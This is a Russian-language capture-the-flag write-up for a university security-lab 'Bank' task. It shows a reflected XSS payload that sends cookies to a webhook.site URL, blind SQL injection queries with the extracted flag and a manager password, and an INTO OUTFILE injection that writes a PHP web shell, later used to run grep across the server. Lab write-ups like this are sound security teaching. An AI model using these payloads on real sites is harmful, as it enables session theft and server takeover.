## 3) Bank - http://bank.tasks.prak.seclab.cs.msu.ru/  

## 1st FLAG

При попытках просто менеджеру отправить ссылку на наш вебхук с .документ
кукки, к сожалению, чета ничего он не делает

Значит они как то проверяют ссылки или просто не нажимают

Проверяют = фильтр?
Надо как то попробовать его обойти, если он есть

`http://bank.tasks.prak.seclab.cs.msu.ru/login.php?account_name=%27%3E%3Cscript>location.href=%22https://webhook.site/a2983c50-603d-46c7-9512-f284d82105a4/?%22+document.cookie</script%3E%3Cselect%20name=%27123%27%20&login=&pw= `
==== что то не приходит ничего, неужели просто не проверяются ссылки?

`http://bank.tasks.prak.seclab.cs.msu.ru/login.php?account_name=%27%3E%3Cimg%20src%3Dx%20onerror%3D%22this.src%3D%27https%3A%2F%2Fwebhook.site%2Fa2983c50-603d-46c7-9512-f284d82105a4%3Fc%3D%27%2Bdocument.cookie%22%3E&pw=x`

GG guys 

hey=great_job_but_you_can_go_further__here ...................

## 2nd FLAG

 /parts/ ...?

Когда зашел http://bank.tasks.prak.seclab.cs.msu.ru/parts/, там был файл
check-users.inc, там было:

	php
	$query_res = mysql_query(
	    "SELECT money FROM regular_user_data WHERE id = ".$_REQUEST['client'],
	    $db_link
	);

Мгм, здесь client прямо так подставляется в строку запроса

Поведение страницы
Страница /check-users.php?client=1 выдавала "OK, balance is positive." 

1 AND 1=1 – получили positive
1 AND 1=2 – получили error (что странно конечно же)

====> сервер выполняет SQL код )



1) Сколько таблиц? 
SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()) >
N

http://bank.tasks.prak.seclab.cs.msu.ru/check-users.php?client=1%20AND%20(SELECT%20COUNT(*)%20FROM%20information_schema.tables%20WHERE%20table_schema=database())%20%3E%20N

N = 1,2,3... 4 gg

2) Имена таблиц
Для каждой таблицы по порядку (LIMIT 0,1; LIMIT 1,1; …), посимвольно  
Сначала длина: LENGTH(table_name) = L,  
подбирали L, пока не получим true  

Затем каждый символ: ASCII(SUBSTRING(table_name, pos, 1)) = K – перебирали код
K, пока не получим true

4 имени
important_bank_data – подозрительное название  

3) Поиск подходящего столбца в таблице  
Для таблицы important_bank_data нужно было проверить, есть ли в ней столбцы, которые могут содержать флаг   
EXISTS(SELECT * FROM information_schema.columns WHERE table_name='...' AND column_name='flag')  
=====> нашли столбец флаг

4) Что то с main_
EXISTS(SELECT * FROM important_bank_data WHERE flag LIKE 'main_%') – true


Имя: important_bank_data  
VM97:71    Столбцов: 2  
VM97:78    🔹 Столбец: flag  
VM97:87       Строк: 1  
VM97:94          [0] = main_f92b94bb47eb3589c64dda32920718  
VM97:78    🔹 Столбец: and_one_more_thing  
VM97:87       Строк: 1  
VM97:94          [0] = Great job, thats all with main flags here. You could stop here and move on to the next task. Or go even further and take over the server. There is something waiting for you on a disk, in a file named "flag"

VM97:56   
📋 Таблица #2:  
VM97:62    Имя: managers  
VM97:71    Столбцов: 2  
VM97:78    🔹 Столбец: name  
VM97:87       Строк: 1  
VM97:94          [0] = manager  
VM97:78    🔹 Столбец: password  
VM97:87       Строк: 1  
VM97:94          [0] = FHhg_fu43_w9ug34ghdsoz__32h43gh3984gzg4g3  

## 3rd FLAG

Получение RCE через SQLi

Используем INTO OUTFILE для записи PHP скрипта в директорию /parts/  

http://bank.tasks.prak.seclab.cs.msu.ru/check-users.php?client=9999%20UNION%20SELECT%20%22%3C%3Fphp%20system(%24_GET%5B%27cmd%27%5D)%3B%20%3F%3E%22%20INTO%20OUTFILE%20%27/var/www/html/parts/shell.php%27

Проверяем наличие shell  
	/parts/shell.php?cmd=ls  
Видим список файлов, включая shell.php - nice  

Поиск третьего флага через шелл  
Используем команду grep для поиска строки main_ во всех файлах на сервере:  

text
http://bank.tasks.prak.seclab.cs.msu.ru/parts/shell.php?cmd=grep%20-r%20%22main_%22%20/%202%3E/dev/null
